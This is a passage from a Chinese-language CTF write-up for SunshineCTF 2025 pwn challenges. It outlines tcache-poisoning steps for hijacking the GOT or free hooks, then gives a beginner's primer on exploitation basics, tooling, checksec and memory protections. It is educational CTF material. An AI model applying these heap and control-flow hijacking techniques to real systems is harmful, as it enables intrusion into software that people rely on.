\texttt{stored\ \allowbreak{}=\ \allowbreak{}ptr\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}((u64)\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}（XOR
key 用的是 \textbf{user 位址}，不是 chunk 標頭），要先 leak 才能反推 \\
4. 投毒 & 用 UAF write 把 \texttt{fd} 改成目標位址，下一次
\texttt{malloc} 就回傳那個位址 \\
5. 劫持 & 覆寫 GOT / 全域函式指標 / \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook}（2.34
以後沒有 hook 了） \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※閱讀
一次讀完整份（單一檔案版）}\label{ux95b1ux8b80-ux4e00ux6b21ux8b80ux5b8cux6574ux4efdux55aeux4e00ux6a94ux6848ux7248}

不想在目錄之間跳來跳去的話，這裡有一份把 \texttt{README} +
\texttt{00\_\allowbreak{}基礎知識} + 7 題筆記 + 速查表 合併起來的單一檔案（約 10,700
行）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
wp/SunshineCTF2025_pwn_完整writeup.md
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※查
三輪新手適用性審查}\label{ux67e5-ux4e09ux8f2aux65b0ux624bux9069ux7528ux6027ux5be9ux67e5}

全部寫完之後，另外跑了 \textbf{3
輪獨立審查}，每一輪都由不同的審查者重新對 binary 驗證，
並由另一組人套用修正：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
輪次
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
範圍
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
發現
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
修正紀錄
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
第 1 輪 & \texttt{wp/\allowbreak{}00}、\texttt{wp/\allowbreak{}99}、pwn1、pwn7 & 16 條錯誤（含 1
條會直接誤導新手的 \texttt{rax} 說明）＋ 18 個新手卡點 &
\texttt{fixes\_\allowbreak{}round1\_\allowbreak{}applied.\allowbreak{}md}（16/16 已修） \\
第 2 輪 & 全部 7 題筆記 + \texttt{wp/\allowbreak{}00} + \texttt{wp/\allowbreak{}99} +
\texttt{README} & 約 51 條錯誤 ＋ 33 個新手卡點（依堆疊／format
string／heap／ROP+基礎四份報告） &
\texttt{fixes\_\allowbreak{}round2\_\allowbreak{}*.\allowbreak{}md}（全部套用） \\
第 3 輪 & 端到端重現、冷讀模擬、回歸查核 & 21/21 遠端重現 PASS；1
條高風險殘留錯誤 ＋ 5 條小瑕疵；冷讀 7/10、回歸 9/10 &
\texttt{fixes\_\allowbreak{}round3\_\allowbreak{}*.\allowbreak{}md}（全部套用） \\
\end{longtable}
}

審查報告原文都保留在 \texttt{wp/\allowbreak{}review\_\allowbreak{}round*.\allowbreak{}md}，修正紀錄在
\texttt{wp/\allowbreak{}fixes\_\allowbreak{}round*.\allowbreak{}md}， 另外
\texttt{wp/\allowbreak{}pending\_\allowbreak{}wp00\_\allowbreak{}fixes\_\allowbreak{}*.\allowbreak{}md} 是第 2
輪跨檔案的待辦清單（已套用完畢）。

\begin{quote}
※提示 \textbf{為什麼要留著這些報告？}
因為它們同時也是很好的教材：裡面記錄了「哪些看起來很合理、其實是錯的」的推論
（例如「glibc 的 \texttt{read}/\texttt{write} wrapper 會弄髒
\texttt{rdx}」是假的； 「\texttt{\%\allowbreak{}17\$\allowbreak{}hhn} 這幾個字元本身會增加
\texttt{\%\allowbreak{}n} 的計數」也是假的）。 這些正是新手最容易自己騙自己的地方。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{✓ 可重現性}\label{ux53efux91cdux73feux6027}

每一支 exploit 都經過： - 本地測試（含本地假 flag） - 遠端實測（真實
flag）：\texttt{./\allowbreak{}wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh} → \textbf{7/7 全部印出真 flag} -
多次重跑確認穩定（每一題至少 3 次） - 7 個 \texttt{pwnN/\allowbreak{}FLAG.\allowbreak{}txt}
與文件中的 Flag 欄\textbf{逐字元比對一致}

所有記憶體位址、offset、gadget 位址\textbf{都是用 gdb / objdump
實際驗證過的}， 筆記裡附有可重跑的 gdb 腳本，不是憑空寫出來的數字。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 1 ---
基礎知識：從零開始}\label{part-1-ux57faux790eux77e5ux8b58ux5f9eux96f6ux958bux59cb}

\begin{quote}
原始檔案：\texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md}
\end{quote}

\subsection{從零開始：pwn 入門到
ROP/SROP}\label{ux5f9eux96f6ux958bux59cbpwn-ux5165ux9580ux5230-ropsrop}

\begin{quote}
這份文件給\textbf{完全沒學過 pwn / ROP / SROP} 的人。 讀完它 +
各題自己的 \texttt{notes.\allowbreak{}md}，你就能看懂 \texttt{pwn1} \textasciitilde{}
\texttt{pwn7} 的解題過程。

閱讀順序建議： 1. 本篇（00） 2.
\texttt{../\allowbreak{}pwn1/\allowbreak{}notes.\allowbreak{}md}（SROP，最完整的一題教學） 3.
\texttt{../\allowbreak{}pwn2/\allowbreak{}notes.\allowbreak{}md} \textasciitilde{} \texttt{../\allowbreak{}pwn7/\allowbreak{}notes.\allowbreak{}md}

※注意 \textbf{本檔不含 heap 章節}（chunk / bin / tcache /
safe-linking）。 pwn4、pwn6 是 heap 題，讀它們的 \texttt{notes.\allowbreak{}md}
之前請\textbf{先讀 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.1～§5.4}
------那裡才是從零講起、有圖、有 gdb 實測的 heap 教學。
\texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md} §8
是同一批內容的\textbf{速查版}，請\textbf{讀完 pwn4 §5
之後}再去查它，不要從它開始。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{目錄}\label{ux76eeux9304}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[1-ux5fc3ux614bux8207ux524dux7f6eux4f5cux696d]{心態與前置作業}
\item
  \hyperref[2-ux74b0ux5883ux5b89ux88dd]{環境安裝}
\item
  \hyperref[3-elf-ux57f7ux884cux6a94ux7684ux9577ux76f8]{ELF
  執行檔的長相}
\item
  \hyperref[4-ux4fddux8b77ux6a5fux5236ux7e3dux8868checksec]{保護機制總表（checksec）}
\item
  \hyperref[5-x86-64-ux7d44ux5408ux8a9eux8a00ux901fux6210]{x86-64
  組合語言速成}
\item
  \hyperref[6-ux51fdux5f0fux547cux53ebux8207ux5806ux758aux6846ux67b6]{函式呼叫與堆疊框架}
\item
  \hyperref[7-ux7cfbux7d71ux547cux53ebsyscall]{系統呼叫（syscall）}
\item
  \hyperref[8-plt-ux8207-got]{PLT 與 GOT}
\item
  \hyperref[9-ux5e38ux898bux6f0fux6d1eux985eux578b]{常見漏洞類型}
\item
  \hyperref[10-rop-ux5f9eux96f6ux958bux59cb]{ROP 從零開始}
\item
  \hyperref[11-srop]{SROP}
\item
  \hyperref[12-pwntools-ux5e38ux7528-api]{pwntools 常用 API}
\item
  \hyperref[13-gdb-ux9664ux932fux901fux67e5]{gdb 除錯速查}
\item
  \hyperref[14-ux627e-gadget]{找 gadget}
\item
  \hyperref[15-ux89e3ux984c-sop]{解題 SOP}
\item
  \hyperref[ux9644ux9304ux672cux7cfbux5217-7-ux984cux5c0dux7167ux8868]{附錄：本系列
  7 題對照表}
\end{enumerate}

\begin{quote}
※ \textbf{heap 題（pwn4 \texttt{cache\_\allowbreak{}money}、pwn6
\texttt{code\_\allowbreak{}breaker}）的入門路徑}： 本檔沒有 heap 章節。請\textbf{先讀
\texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.1～§5.4}（chunk 長什麼樣 → free 之後
發生什麼事 → tcache 怎麼運作 → safe-linking 想防什麼；\textbf{從零講，有
ASCII 圖與 gdb 實測值}）。 讀完再回頭把 \texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md} §8
當\textbf{速查表}用（它開頭也有「入門三句話」可以對照）；
\texttt{../\allowbreak{}pwn6/\allowbreak{}notes.\allowbreak{}md} §3.5 另外有一份 20 行的最小語彙整理。

※注意 \textbf{不建議從 \texttt{99} §8 開始讀 heap}：那份的定位是「已經會
heap 的人查數字用」。
它開頭雖然有一小段「入門三句話」，\texttt{unsorted\ \allowbreak{}bin}、\texttt{PREV\_\allowbreak{}INUSE}、\texttt{FSOP}、\texttt{aligned\_\allowbreak{}OK}
這些詞也都各補了一句話，但\textbf{只夠你認得名字、不足以理解機制} ------
真正把「chunk 長什麼樣、free 之後發生什麼事」講完的是 \texttt{pwn4}
§5.1～§5.4。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1.
心態與前置作業}\label{ux5fc3ux614bux8207ux524dux7f6eux4f5cux696d}

pwn 的核心問題永遠是同一個：

\begin{quote}
\textbf{「我要怎麼讓程式去做它原本不會做的事？」}
\end{quote}

手段幾乎都是「找到一個能\textbf{寫到不該寫的地方}的 bug」，然後：

\begin{itemize}
\tightlist
\item
  改掉\textbf{返回位址} → 控制 \texttt{rip}
\item
  改掉\textbf{函式指標 / GOT} → 間接控制 \texttt{rip}
\item
  改掉\textbf{資料} → 讓程式邏輯往對自己有利的方向走
\end{itemize}

\paragraph{前置知識（不用很熟，看得懂就好）}\label{ux524dux7f6eux77e5ux8b58ux4e0dux7528ux5f88ux719fux770bux5f97ux61c2ux5c31ux597d}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
主題
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
需要的程度
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
C 語言 & 看得懂 \texttt{char\ \allowbreak{}buf{[}64{]};\ \allowbreak{}read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}256);}
有問題 \\
組合語言 & 知道
\texttt{mov}/\texttt{call}/\texttt{ret}/\texttt{push}/\texttt{pop}
大概在做什麼（本篇第 5 節會教） \\
Linux 指令 &
\texttt{ls}、\texttt{cat}、\texttt{chmod}、\texttt{file}、\texttt{strings} \\
Python & 會寫函式、懂 bytes vs str \\
\end{longtable}
}

\paragraph{名詞表}\label{ux540dux8a5eux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
名詞
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{binary / chal} & 題目給的執行檔 \\
\textbf{flag} & 要偷出來的目標字串，本系列長得像 \texttt{sun\{\allowbreak{}...\allowbreak{}\}\allowbreak{}} \\
\textbf{remote} & 主辦方架的伺服器，跑同一支 binary，你要打它才拿得到真
flag \\
\textbf{leak（洩漏）} & 想辦法讓程式把記憶體內容印給你 \\
\textbf{gadget} & 程式裡以 \texttt{ret}（或
\texttt{jmp}/\texttt{call}）結尾的一小段指令 \\
\textbf{payload} & 你送過去的惡意輸入 \\
\textbf{shell} & 拿到 \texttt{sh} 之後可以執行任意指令 \\
\textbf{ROP} & Return-Oriented Programming，用 gadget 串出任意行為 \\
\textbf{SROP} & Sigreturn-Oriented Programming，用
\texttt{rt\_\allowbreak{}sigreturn} 一次設定所有暫存器 \\
\textbf{canary} &
編譯器放在堆疊上的「金絲雀」隨機值，被改掉就中止程式（見 4.1） \\
\textbf{RELRO} & 決定「GOT 能不能寫」的保護（見 4.4）；Full
RELRO＝不能改 GOT \\
\textbf{little-endian（小端）} &
一個多位元組整數在記憶體裡「低位元組放低位址」。x86-64 是小端，所以
\texttt{p64(0x401040)} 的 bytes 是
\texttt{40\ \allowbreak{}10\ \allowbreak{}40\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00}（反著看就對了） \\
\textbf{shellcode} & 一段「執行起來會幫你開 shell」的機器碼（通常用
\texttt{execve("/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}0,\allowbreak{}0)} 組出來）。堆疊可執行時可以直接把它的
bytes 當輸入送進去，再跳過去執行 \\
\textbf{TLS（Thread-Local Storage）} &
每個執行緒自己的資料區，\texttt{fs} 這個段暫存器指向它。\textbf{canary
就放在 \texttt{fs:\allowbreak{}0x28}}，所以同一執行緒裡每個函式的 canary 值都一樣 \\
\textbf{ZF（Zero Flag）} & CPU 旗標：上一次 \texttt{cmp} / \texttt{test}
的結果是 0 時設起來。\texttt{je} / \texttt{jne} 看的就是它（見 5.2） \\
\textbf{漏洞（vulnerability）} &
程式「寫到不該寫的地方」或「讀到不該讀的地方」的設計缺陷（見第 9
節的表）。用它製造 \textbf{leak}（讀）或控制
\texttt{rip}（寫），兩者常常要\textbf{先 leak 再打} \\
\textbf{tcache} & glibc 2.26+ 的「小 chunk 快取」：每個執行緒 64
條鏈、每條最多 7 塊、LIFO。heap 題的主戰場（本檔沒有 heap
章節，見開頭指路） \\
\textbf{one-gadget} & libc 裡「跳到這個位址就會直接開
shell」的單一指令位置（用 \texttt{one\_\allowbreak{}gadget}
找）。通常附帶條件（某些暫存器必須是 0），要用 gdb 確認 \\
\textbf{va\_list} & 可變參數清單。SysV AMD64 上是一塊 24 bytes
的結構（\texttt{gp\_\allowbreak{}offset} / \texttt{fp\_\allowbreak{}offset} /
\texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area} /
\texttt{reg\_\allowbreak{}save\_\allowbreak{}area}）。暫時放參數的暫存器用完之後，參數改從
\texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area} 往高位址拿 ------
\textbf{它一旦被初始化成使用者的緩衝區，就等於「使用者控制了參數」}（pwn3
的漏洞，實測見 \texttt{../\allowbreak{}pwn3/\allowbreak{}notes.\allowbreak{}md} §4.1） \\
\textbf{IFUNC（indirect function）} &
「間接函式」：載入時執行一小段選擇器，挑出 CPU 最適合的實作（例如
\texttt{\_\allowbreak{}\_\allowbreak{}strcspn\_\allowbreak{}avx2}）。所以 GOT
裡放的是\textbf{被挑中的那個實作}的位址，\textbf{不等於}
\texttt{readelf\ \allowbreak{}-\allowbreak{}s\ \allowbreak{}libc.\allowbreak{}so.\allowbreak{}6} 看到的符號值 → 拿這種符號當 libc
指紋會誤判（pwn3 踩過這個坑） \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2. 環境安裝}\label{ux74b0ux5883ux5b89ux88dd}

\begin{quote}
※注意 \textbf{現代 Linux 不能直接 \texttt{pip\ \allowbreak{}install}（PEP 668）}
如果你看到
\texttt{error:\allowbreak{}\ \allowbreak{}externally-\allowbreak{}managed-\allowbreak{}environment}，那是發行版在保護系統
Python， \textbf{不是你的指令打錯}。三個選項（挑一個）：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# A. 用發行版套件（最推薦，版本由發行版維護）}
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ python{-}pwntools ropgadget ropper gdb   }\CommentTok{\# Arch / Manjaro（都在 extra）}
\FunctionTok{sudo}\NormalTok{ apt install python3{-}pwntools ropgadget gdb       }\CommentTok{\# Ubuntu 24.04+}

\CommentTok{\# B. 用 venv（乾淨、不污染系統；任何發行版都能用）}
\ExtensionTok{python3} \AttributeTok{{-}m}\NormalTok{ venv \textasciitilde{}/.pwn }\KeywordTok{\&\&} \BuiltInTok{source}\NormalTok{ \textasciitilde{}/.pwn/bin/activate}
\ExtensionTok{pip}\NormalTok{ install pwntools ropgadget}
\CommentTok{\#    或用 pipx 裝成獨立指令：sudo pacman {-}S python{-}pipx \&\& pipx install pwntools}

\CommentTok{\# C. 硬要裝進系統 Python（有風險，自己負責）}
\ExtensionTok{pip}\NormalTok{ install }\AttributeTok{{-}{-}break{-}system{-}packages}\NormalTok{ pwntools ropgadget}
\end{Highlighting}
\end{Shaded}

本文件後面的 \texttt{python3\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}"from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*"}
需要上面任一種安裝成功才能跑。 不確定某個套件在 Ubuntu
叫什麼名字時先查：\texttt{apt-\allowbreak{}cache\ \allowbreak{}policy\ \allowbreak{}python3-\allowbreak{}pwntools}
（有輸出才裝得下去；查不到就改用選項 B）。
\end{quote}

\paragraph{Arch / Manjaro}\label{arch-manjaro}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ python{-}pwntools gdb       }\CommentTok{\# python{-}pwntools 就在 extra（4.15.0{-}2）}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(\textquotesingle{}pwntools ok\textquotesingle{})"}     \CommentTok{\# 驗證安裝}
\end{Highlighting}
\end{Shaded}

\paragraph{Ubuntu / Debian}\label{ubuntu-debian}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt update}
\FunctionTok{sudo}\NormalTok{ apt install gdb python3{-}pwntools    }\CommentTok{\# Ubuntu 24.04+ 有 python3{-}pwntools}
\CommentTok{\# Ubuntu 22.04 及更舊的版本沒有這個套件 → 改用上面的選項 B（venv / pipx）}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(\textquotesingle{}pwntools ok\textquotesingle{})"}
\end{Highlighting}
\end{Shaded}

\paragraph{強烈推薦的 gdb
外掛}\label{ux5f37ux70c8ux63a8ux85a6ux7684-gdb-ux5916ux639b}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# pwndbg：最好用的 pwn gdb 外掛}
\FunctionTok{git}\NormalTok{ clone https://github.com/pwndbg/pwndbg}
\BuiltInTok{cd}\NormalTok{ pwndbg }\KeywordTok{\&\&} \ExtensionTok{./setup.sh}
\end{Highlighting}
\end{Shaded}

裝好之後 gdb 會有
\texttt{checksec}、\texttt{telescope}、\texttt{heap}、\texttt{bins}、\texttt{vmmap}、
\texttt{vis\_\allowbreak{}heap\_\allowbreak{}chunks} 等指令，解題速度差好幾倍。 （下面第 13 節的
\texttt{vmmap} / \texttt{telescope} / \texttt{heap}
這幾條\textbf{只有裝了 pwndbg 才能用}。）

\paragraph{常用工具}\label{ux5e38ux7528ux5de5ux5177}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ ropgadget            }\CommentTok{\# 找 gadget（主要工具，Arch 在 extra）}
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ ropper               }\CommentTok{\# 另一套找 gadget（可選；不裝也可以，見第 14 節）}
\ExtensionTok{gem}\NormalTok{  install one\_gadget             }\CommentTok{\# 找 libc 裡的 one{-}gadget}
\ExtensionTok{gem}\NormalTok{  install seccomp{-}tools          }\CommentTok{\# 查 seccomp 規則（Ruby gem，不是 pip 套件，要先裝 ruby）}
\FunctionTok{sudo}\NormalTok{ pacman }\AttributeTok{{-}S}\NormalTok{ patchelf             }\CommentTok{\# 改 ELF（換 libc / ld 用）}
\end{Highlighting}
\end{Shaded}

\begin{quote}
\texttt{gem} 是 Ruby 的套件管理器：\texttt{sudo\ \allowbreak{}pacman\ \allowbreak{}-\allowbreak{}S\ \allowbreak{}ruby} /
\texttt{sudo\ \allowbreak{}apt\ \allowbreak{}install\ \allowbreak{}ruby}。
\end{quote}

\paragraph{\texorpdfstring{\texttt{checksec}（看保護機制）}{checksec（看保護機制）}}\label{checksecux770bux4fddux8b77ux6a5fux5236}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# ✶ 首選：pwntools 一行版，不用額外裝東西，任何機器都能跑}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(ELF(\textquotesingle{}./challenge\textquotesingle{}, checksec=False).checksec())"}

\CommentTok{\# 或者：如果你的系統有 \textasciigrave{}checksec\textasciigrave{} 這個「獨立指令」}
\ExtensionTok{checksec} \AttributeTok{{-}{-}file}\OperatorTok{=}\NormalTok{./challenge}
\end{Highlighting}
\end{Shaded}

實測輸出（\texttt{pwn4/\allowbreak{}cache\_\allowbreak{}money}，原樣貼上）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'$ORIGIN'
FORTIFY:    Enabled
SHSTK:      Enabled
IBT:        Enabled
\end{Verbatim}

\begin{quote}
※注意 \textbf{\texttt{checksec} 這個指令不是每個系統都有}，打了可能得到
\texttt{command\ \allowbreak{}not\ \allowbreak{}found}： * 它是 pwntools 附的一支 console script →
用 \textbf{pipx / venv} 裝 pwntools 時， 它會躺在那個 venv 的
\texttt{bin/} 裡，\textbf{不在你的 \texttt{PATH}}； * Arch 要
\texttt{sudo\ \allowbreak{}pacman\ \allowbreak{}-\allowbreak{}S\ \allowbreak{}checksec}、Debian/Ubuntu 要
\texttt{sudo\ \allowbreak{}apt\ \allowbreak{}install\ \allowbreak{}checksec}； * 裝了 \textbf{pwndbg} 的話，gdb
\textbf{裡面}也有一個 \texttt{checksec}（那是 gdb 指令，不是 shell
指令）。

\textbf{三種都沒有也能做事} ------ 用上面的 pwntools
一行版本即可，輸出內容完全一樣。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3. ELF
執行檔的長相}\label{elf-ux57f7ux884cux6a94ux7684ux9577ux76f8}

Linux 的可執行檔格式叫 \textbf{ELF}。用 \texttt{readelf\ \allowbreak{}-\allowbreak{}l}
可以看「程式載入時長怎樣」：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
Type      Offset   VirtAddr           PhysAddr           FileSiz  MemSiz  Flg
LOAD      0x000000 0x0000000000400000 0x0000000000400000 0x000b0  0x0b0   R
LOAD      0x001000 0x0000000000401000 0x0000000000401000 0x0006c  0x06c   R E
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{R} = 可讀、\texttt{E} = 可執行、\texttt{W} = 可寫
\item
  這支程式碼被載入到 \texttt{0x401000}，所以所有指令位址都是固定的（這種
  binary 叫 \textbf{non-PIE}，見 4.3 節）
\end{itemize}

重要 section：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
Section & 內容 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{.\allowbreak{}text} & 程式碼（可執行） \\
\texttt{.\allowbreak{}rodata} & 唯讀資料（字串常數、格式字串） \\
\texttt{.\allowbreak{}data} & 已初始化的全域變數（可寫） \\
\texttt{.\allowbreak{}bss} & 未初始化的全域變數（可寫，一開始是 0） \\
\texttt{.\allowbreak{}got} / \texttt{.\allowbreak{}got.\allowbreak{}plt} & 存外部函式實際位址的表格（見第 8
節） \\
\texttt{.\allowbreak{}plt} & 呼叫外部函式的跳板（見第 8 節） \\
\end{longtable}
}

看 section：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{readelf} \AttributeTok{{-}S}\NormalTok{ ./challenge}
\end{Highlighting}
\end{Shaded}

看符號（函式名、全域變數）：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{readelf} \AttributeTok{{-}s}\NormalTok{ ./challenge     }\CommentTok{\# 有 symbol 的}
\FunctionTok{nm}\NormalTok{ ./challenge}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4.
保護機制總表（checksec）}\label{ux4fddux8b77ux6a5fux5236ux7e3dux8868checksec}

解題第一件事就是 \texttt{checksec}。這五個保護決定了你能用哪些技巧。

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# ✶ 先跑這行（pwntools 版，不必額外安裝；\textasciigrave{}checksec\textasciigrave{} 這個指令很多系統根本沒有）}
\ExtensionTok{python3} \AttributeTok{{-}c} \StringTok{"from pwn import *; print(ELF(\textquotesingle{}./challenge\textquotesingle{}, checksec=False).checksec())"}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※ 這一節會用到
\texttt{rbp}、\texttt{rsp}、\texttt{fs:\allowbreak{}0x28}、\texttt{je}、\texttt{call}
這些名字。 如果還不熟，\textbf{先跳到第 5、6
節看完再回來}（保護機制要先知道「它保護什麼」才看得懂）。
這五個保護的「結論」比「原理」重要：先記住它們對解題的限制，原理稍後補。
\end{quote}

\paragraph{4.1 Stack
Canary（堆疊金絲雀）}\label{stack-canaryux5806ux758aux91d1ux7d72ux96c0}

編譯器在每個函式的堆疊上放一個隨機值：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,} \DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}     \CommentTok{; 讀 canary（存在每個執行緒自己的 TLS 區；}
                               \CommentTok{;  fs 這個段暫存器指向它，fs:0x28 就是該區裡的 canary）}
\BuiltInTok{mov}  \DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],} \KeywordTok{rax}   \CommentTok{; 存到堆疊上}
\NormalTok{...}
\BuiltInTok{mov}  \KeywordTok{rdx}\OperatorTok{,} \DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}
\BuiltInTok{sub}  \KeywordTok{rdx}\OperatorTok{,} \DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}     \CommentTok{; 跟原值比}
\ControlFlowTok{je}\NormalTok{   ok}
\ControlFlowTok{call}\NormalTok{ \_\_stack\_chk\_fail           }\CommentTok{; 不一樣 → 程式被殺掉}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \textbf{有 canary}：溢位時不能亂蓋 \texttt{{[}rbp-\allowbreak{}8{]}}，否則程式在
  \texttt{ret} 之前就死了。 → 必須先 \textbf{leak canary}（用 format
  string、或是某個會把資料印出來的 bug）
\item
  \textbf{沒有 canary}：堆疊溢位可以為所欲為
\end{itemize}

\paragraph{4.2 NX /
DEP（不可執行堆疊）}\label{nx-depux4e0dux53efux57f7ux884cux5806ux758a}

\begin{itemize}
\tightlist
\item
  \textbf{NX enabled}：堆疊上的資料不能當程式碼跑 → 不能直接塞 shellcode
  → 只能 \textbf{ROP}（用程式自己有的指令）
\item
  \textbf{NX disabled}：可以把 shellcode 寫在堆疊上然後跳過去
\end{itemize}

\paragraph{4.3 PIE /
ASLR（位址隨機化）}\label{pie-aslrux4f4dux5740ux96a8ux6a5fux5316}

\begin{itemize}
\tightlist
\item
  \textbf{No PIE}：程式碼永遠在 \texttt{0x400000} 附近，位址固定 →
  gadget 位址直接寫死
\item
  \textbf{PIE enabled}：整個程式碼段位址隨機 → \textbf{必須先 leak
  一個程式碼位址} 再算出 base，然後所有 gadget 用
  \texttt{base\ \allowbreak{}+\ \allowbreak{}offset}
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
真實位址 = PIE_base + 檔案裡的 offset
\end{Verbatim}

\begin{quote}
ASLR 是核心層級的隨機化（堆疊、heap、libc、mmap 區每次都不一樣）， PIE
是「編譯時保留重定位資訊，讓程式碼段參與 ASLR」。
\end{quote}

\paragraph{4.3.1 「libc base +
offset」怎麼算（本節最重要的一條算式）}\label{libc-base-offsetux600eux9ebcux7b97ux672cux7bc0ux6700ux91cdux8981ux7684ux4e00ux689dux7b97ux5f0f}

\texttt{base\ \allowbreak{}+\ \allowbreak{}offset}
這件事有\textbf{兩份}，長得一樣但\textbf{不能混用}：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
